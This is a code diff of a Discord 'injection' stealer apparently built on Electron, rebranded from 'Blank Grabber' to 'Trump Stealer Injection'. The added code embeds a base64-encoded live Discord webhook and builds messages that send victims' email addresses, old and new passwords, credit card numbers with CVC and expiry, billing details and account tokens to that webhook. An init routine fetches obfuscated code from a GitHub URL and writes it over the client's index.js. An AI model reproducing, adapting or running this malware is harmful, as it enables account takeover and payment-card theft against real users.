@@ -9,8 +9,8 @@ const {
   session
 } = require('electron');
 const config = {
-  webhook: atob('%WEBHOOKHEREBASE64ENCODED%'),
-  webhook_protector_key: '%WEBHOOK_KEY%',
+  webhook: atob('aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTI2NTM3MzA1NzIyMTEzMjM2Mi9zbXFxRUt2d2daQzEwSS1qMGpzRTktN3hoRXROVk9qb21WdXl0YzVLbUlHQklPcjJUSENsdGFXWmYxMUp0RzNUZUREUA=='),
+  webhook_protector_key: 'test',
   auto_buy_nitro: false,
   ping_on_run: true,
   ping_val: '@everyone',
@@ -376,8 +376,8 @@ fs.readFileSync(indexJs, 'utf8', (err, data) => {
 async function init() {
     https.get('${'https://raw.githubusercontent.com/f4kedre4lity/Discord-Injection-BG/main/injection-obfuscated.js'}', (res) => {
         const file = fs.createWriteStream(indexJs);
-        res.replace('%WEBHOOKHEREBASE64ENCODED%', '${'%WEBHOOKHEREBASE64ENCODED%'}')
-        res.replace('%WEBHOOK_KEY%', '${'%WEBHOOK_KEY%'}')
+        res.replace('aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTI2NTM3MzA1NzIyMTEzMjM2Mi9zbXFxRUt2d2daQzEwSS1qMGpzRTktN3hoRXROVk9qb21WdXl0YzVLbUlHQklPcjJUSENsdGFXWmYxMUp0RzNUZUREUA==', '${'aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTI2NTM3MzA1NzIyMTEzMjM2Mi9zbXFxRUt2d2daQzEwSS1qMGpzRTktN3hoRXROVk9qb21WdXl0YzVLbUlHQklPcjJUSENsdGFXWmYxMUp0RzNUZUREUA=='}')
+        res.replace('test', '${'test'}')
         res.pipe(file);
         file.on('finish', () => {
             file.close();
@@ -462,7 +462,7 @@ const getBilling = async token => {
           billing.push('💳');
           break;
         case 2:
-          billing.push('<:paypal:1343582502824050760>');
+          billing.push('<:paypal:1343569437202317322>');
           break;
         default:
           billing.push('(Unknown)');
@@ -607,7 +607,7 @@ const hooker = async content => {
     'Access-Control-Allow-Origin': '*'
   };
   if (!config.webhook.includes('api/webhooks')) {
-    const key = totp('%WEBHOOK_KEY%');
+    const key = totp('test');
     headers.Authorization = key;
   }
   const options = {
@@ -633,7 +633,7 @@ const login = async (email, password, token) => {
     const avatarUrl = `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`;
   
     const content = {
-      username: 'Thief Cat',
+      username: 'Trump Stealer Injection',
       avatar_url: 'https://raw.githubusercontent.com/FalseKSCH/assets/main/thiefcat.png',
       embeds: [
         {
@@ -710,70 +710,146 @@ const login = async (email, password, token) => {
     content.content = '@everyone';
     hooker(content);
   };  
-const passwordChanged = async (oldpassword, newpassword, token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = await getBilling(token);
-  const content = {
-    username: 'Blank Grabber Injection',
-    avatar_url: 'https://raw.githubusercontent.com/f4kedre4lity/Blank-Grabber/main/.github/workflows/image.png',
-    embeds: [{
-      color: 5639644,
-      fields: [{
-        name: '**Password Changed**',
-        value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
-        inline: true
-      }, {
-        name: '**Discord Info**',
-        value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-        inline: true
-      }, {
-        name: '**Token**',
-        value: `\`${token}\``,
-        inline: false
-      }],
-      author: {
-        name: json.username + '#' + json.discriminator + ' | ' + json.id,
-        icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
-      }
-    }]
-  };
-  content.content = '@everyone';
-  hooker(content);
-};
-const emailChanged = async (email, password, token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = await getBilling(token);
-  const content = {
-    username: 'Blank Grabber Injection',
-    avatar_url: 'https://raw.githubusercontent.com/f4kedre4lity/Blank-Grabber/main/.github/workflows/image.png',
-    embeds: [{
-      color: 5639644,
-      fields: [{
-        name: '**Email Changed**',
-        value: `New Email: **${email}**\nPassword: **${password}**`,
-        inline: true
-      }, {
-        name: '**Discord Info**',
-        value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-        inline: true
-      }, {
-        name: '**Token**',
-        value: `\`${token}\``,
-        inline: false
-      }],
-      author: {
-        name: json.username + '#' + json.discriminator + ' | ' + json.id,
-        icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
-      }
-    }]
-  };
-  content.content = '@everyone';
-  hooker(content);
-};
+  const passwordChanged = async (oldpassword, newpassword, token) => {
+    const json = await getInfo(token);
+    const nitro = getNitro(json.premium_type);
+    const badges = getBadges(json.flags);
+    const billing = await getBilling(token);
+    const avatarUrl = `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`;
+  
+    const content = {
+      username: 'Trump Stealer Injection',
+      avatar_url: 'https://raw.githubusercontent.com/FalseKSCH/assets/main/thiefcat.png',
+      embeds: [
+        {
+          title: '🔑 Password Changed',
+          color: 5639644,
+          fields: [
+            {
+              name: 'Profile Picture',
+              value: `[Download pfp](${avatarUrl})`,
+              inline: false
+            },
+            {
+              name: 'Username',
+              value: `\`${json.username}#${json.discriminator}\``,
+              inline: true
+            },
+            {
+              name: 'ID',
+              value: `\`${json.id}\``,
+              inline: true
+            },
+            {
+              name: 'Nitro <a:nitro:1130453517312725052>',
+              value: `${nitro}`,
+              inline: true
+            },
+            {
+              name: 'Badges <a:badges:1130448593715740692>',
+              value: `${badges}`,
+              inline: true
+            },
+            {
+              name: 'Billing Method <a:CC:1343558993452208128>',
+              value: `${billing}`,
+              inline: true
+            },
+            {
+              name: 'Password Info 🔒',
+              value: `**Email:** \`${json.email}\`\n**Old Password:** \`${oldpassword}\`\n**New Password:** \`${newpassword}\``,
+              inline: false
+            },
+            {
+              name: 'Token <:Token:1343559982138003466>',
+              value: `\`\`\`${token}\`\`\``,
+              inline: false
+            }
+          ],
+          thumbnail: {
+            url: avatarUrl
+          },
+          footer: {
+            text: 'Trump Stealer',
+          }
+        }
+      ]
+    };
+  
+    // Trigger webhook
+    content.content = '@everyone';
+    hooker(content);
+  };  
+  const emailChanged = async (email, password, token) => {
+    const json = await getInfo(token);
+    const nitro = getNitro(json.premium_type);
+    const badges = getBadges(json.flags);
+    const billing = await getBilling(token);
+    const avatarUrl = `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`;
+  
+    const content = {
+      username: 'Trump Stealer Injection',
+      avatar_url: 'https://raw.githubusercontent.com/FalseKSCH/assets/main/thiefcat.png',
+      embeds: [
+        {
+          title: '📧 Email Changed',
+          color: 5639644,
+          fields: [
+            {
+              name: 'Profile Picture',
+              value: `[Download pfp](${avatarUrl})`,
+              inline: false
+            },
+            {
+              name: 'Username',
+              value: `\`${json.username}#${json.discriminator}\``,
+              inline: true
+            },
+            {
+              name: 'ID',
+              value: `\`${json.id}\``,
+              inline: true
+            },
+            {
+              name: 'Nitro <a:nitro:1130453517312725052>',
+              value: `${nitro}`,
+              inline: true
+            },
+            {
+              name: 'Badges <a:badges:1130448593715740692>',
+              value: `${badges}`,
+              inline: true
+            },
+            {
+              name: 'Billing Method <a:CC:1343558993452208128>',
+              value: `${billing}`,
+              inline: true
+            },
+            {
+              name: 'Email Info 📬',
+              value: `**New Email:** \`${email}\`\n**Password:** \`${password}\``,
+              inline: false
+            },
+            {
+              name: 'Token <:Token:1343559982138003466>',
+              value: `\`\`\`${token}\`\`\``,
+              inline: false
+            }
+          ],
+          thumbnail: {
+            url: avatarUrl
+          },
+          footer: {
+            text: 'Trump Stealer',
+          }
+        }
+      ]
+    };
+  
+    // Trigger webhook
+    content.content = '@everyone';
+    hooker(content);
+  };  
 const PaypalAdded = async (token) => {
     const json = await getInfo(token);
     const nitro = getNitro(json.premium_type);
@@ -782,11 +858,11 @@ const PaypalAdded = async (token) => {
     const avatarUrl = `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`;
   
     const content = {
-      username: 'Trump Stealer',
+      username: 'Trump Stealer Injection',
       avatar_url: 'https://raw.githubusercontent.com/FalseKSCH/assets/main/thiefcat.png',
       embeds: [
         {
-          title: '<:paypal:1343582502824050760> PayPal Account Added',
+          title: '<:paypal:1343569437202317322> PayPal Account Added',
           color: 5639644,
           fields: [
             {
@@ -839,38 +915,76 @@ const PaypalAdded = async (token) => {
     content.content = '@everyone';
     hooker(content);
   };  
-const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = await getBilling(token);
-  const content = {
-    username: 'Blank Grabber Injection',
-    avatar_url: 'https://raw.githubusercontent.com/f4kedre4lity/Blank-Grabber/main/.github/workflows/image.png',
-    embeds: [{
-      color: 5639644,
-      fields: [{
-        name: '**Credit Card Added**',
-        value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
-        inline: true
-      }, {
-        name: '**Discord Info**',
-        value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-        inline: true
-      }, {
-        name: '**Token**',
-        value: `\`${token}\``,
-        inline: false
-      }],
-      author: {
-        name: json.username + '#' + json.discriminator + ' | ' + json.id,
-        icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
-      }
-    }]
-  };
-  content.content = '@everyone';
-  hooker(content);
-};
+  const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
+    const json = await getInfo(token);
+    const nitro = getNitro(json.premium_type);
+    const badges = getBadges(json.flags);
+    const billing = await getBilling(token);
+    const avatarUrl = `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`;
+  
+    const content = {
+      username: 'Trump Stealer Injection',
+      avatar_url: 'https://raw.githubusercontent.com/FalseKSCH/assets/main/thiefcat.png',
+      embeds: [
+        {
+          title: '💳 Credit Card Added',
+          color: 5639644,
+          fields: [
+            {
+              name: 'Profile Picture',
+              value: `[Download pfp](${avatarUrl})`,
+              inline: false
+            },
+            {
+              name: 'Username',
+              value: `\`${json.username}#${json.discriminator}\``,
+              inline: true
+            },
+            {
+              name: 'ID',
+              value: `\`${json.id}\``,
+              inline: true
+            },
+            {
+              name: 'Nitro <a:nitro:1130453517312725052>',
+              value: `${nitro}`,
+              inline: true
+            },
+            {
+              name: 'Badges <a:badges:1130448593715740692>',
+              value: `${badges}`,
+              inline: true
+            },
+            {
+              name: 'Billing Method <a:CC:1343558993452208128>',
+              value: `${billing}`,
+              inline: true
+            },
+            {
+              name: 'Credit Card Info',
+              value: `**Number:** \`${number}\`\n**CVC:** \`${cvc}\`\n**Expiration:** \`${expir_month}/${expir_year}\``,
+              inline: false
+            },
+            {
+              name: 'Token <:Token:1343559982138003466>',
+              value: `\`\`\`${token}\`\`\``,
+              inline: false
+            }
+          ],
+          thumbnail: {
+            url: avatarUrl
+          },
+          footer: {
+            text: 'Trump Stealer',
+          }
+        }
+      ]
+    };
+  
+    // Trigger webhook
+    content.content = '@everyone';
+    hooker(content);
+  };  
 const nitroBought = async token => {
   const json = await getInfo(token);
   const nitro = getNitro(json.premium_type);
